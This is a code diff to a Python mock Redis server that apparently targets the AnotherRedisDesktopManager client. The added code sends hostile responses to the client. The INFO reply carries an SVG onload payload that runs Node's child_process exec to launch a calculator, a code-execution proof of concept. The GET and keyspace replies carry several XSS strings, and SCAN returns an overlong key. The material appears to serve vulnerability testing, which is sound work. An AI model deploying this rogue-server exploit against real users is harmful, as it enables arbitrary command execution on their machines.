@@ -3,6 +3,8 @@ import re
 import random
 from boofuzz.utils.enhanced_symbolic_execution import generate_protocol_data, generate_binary_data
 
+
+# https://github.com/qishibo/AnotherRedisDesktopManager
 def parse_resp(data):
     """严格解析RESP协议数据"""
     try:
@@ -68,6 +70,34 @@ def create_array_response(items):
             parts.append(create_bulk_string_response(str(item)))
     return ''.join(parts)
 
+
+def get_mock_info_test():
+    os_data = '<svg/onload="(function(){\n\
+  const { exec } = require(\'child_process\');\n\
+  const cmd = process.platform === \'win32\' \n\
+    ? \'calc.exe\' \n\
+    : process.platform === \'darwin\' \n\
+      ? \'open -a Calculator\' \n\
+      : \'xcalc\';\n\
+  exec(cmd);\n\
+})()">'
+    test = '<img src=x onerror=alert(1) />'
+    base_lines = [
+            "# Server",
+            f"redis_version:{test}",
+            "redis_mode:standalone", 
+            f"os:{os_data}",
+            "tcp_port:6379",
+            "uptime_in_days:1",
+            "# Clients",
+            "connected_clients:1",
+            "# Memory",
+            "used_memory_human:1.00M",
+            "# Keyspace", 
+            "<img src=x onerror=alert(1) />:keys=5,expires=0"
+        ]
+    return "\r\n".join(base_lines)
+
 def get_mock_info():
     """生成严格符合协议的INFO响应 - 集成boofuzz变异"""
     try:
@@ -84,7 +114,8 @@ def get_mock_info():
             "# Server",
             f"redis_version:{redis_versions[0] if redis_versions else '6.2.5'}",
             "redis_mode:standalone",
-            f"os:{redis_os}",
+            #f"os:{redis_os}",
+            "os:Linux x86_64",
             "tcp_port:6379",
             f"uptime_in_days:{redis_values[0] if redis_values else '1'}",
             "# Clients",
@@ -117,7 +148,7 @@ def get_mock_info():
             "# Memory",
             "used_memory_human:1.00M",
             "# Keyspace", 
-            "db0:keys=5,expires=0"
+            "<img src=x onerror=alert(1) />:keys=5,expires=0"
         ]
     
     return "\r\n".join(base_lines)
@@ -145,16 +176,29 @@ def handle_command(command):
     if cmd == 'scan' and len(command) >= 2:
         cursor = command[1]
         if cursor == '0':
-            return create_array_response(["79", ["user1", "user2", "order1"]])
+            return create_array_response(["79", ['a' * 1500]])
         elif cursor == '79':
-            return create_array_response(["0", ["order2", "product"]])
+            return create_array_response(["0", []])
         else:
             return create_array_response(["0", []])
     
     # 处理INFO命令
     if cmd == 'info':
-        return create_bulk_string_response(get_mock_info())
+        return create_bulk_string_response(get_mock_info_test())
     
+    if cmd == "type":
+        return create_simple_string_response("string")
+
+    if cmd == "get":
+        data = '\u003Cimg src=x onerror="alert(\u0027Unicode-Bypass\u0027)"\u003E'
+        data = '";alert(1);//'
+        data = '${alert(1)}'
+        data = '</div><script>alert(1)</script><div>'
+        return create_simple_string_response(data)
+
+    if cmd == "quit":
+        return create_simple_string_response("OK")
+
     # 未知命令
     return create_error_response(f"ERR unknown command '{command[0]}'")
 
